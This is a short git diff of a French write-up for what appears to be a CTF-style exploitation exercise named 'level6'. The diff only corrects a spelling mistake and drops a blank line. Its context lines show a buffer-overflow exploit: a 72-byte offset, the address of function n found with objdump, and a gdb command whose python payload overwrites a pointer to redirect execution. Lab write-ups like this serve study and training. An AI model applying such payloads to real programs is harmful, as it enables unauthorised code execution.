@@ -22,7 +22,7 @@ recherche de l'offset:
 
 	Offset = 72
 
-Avec un objdump -d -j .text level6 on recupere l'addresse de la fonction n : 0x8048454
+Avec un objdump -d -j .text level6 on recupere l'adresse de la fonction n : 0x8048454
 
 r $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
 
@@ -58,4 +58,3 @@ p 0x804a050 - 0x804a008
 $2 = 0x48 = 72
 
 On retrouve bien notre offset
-
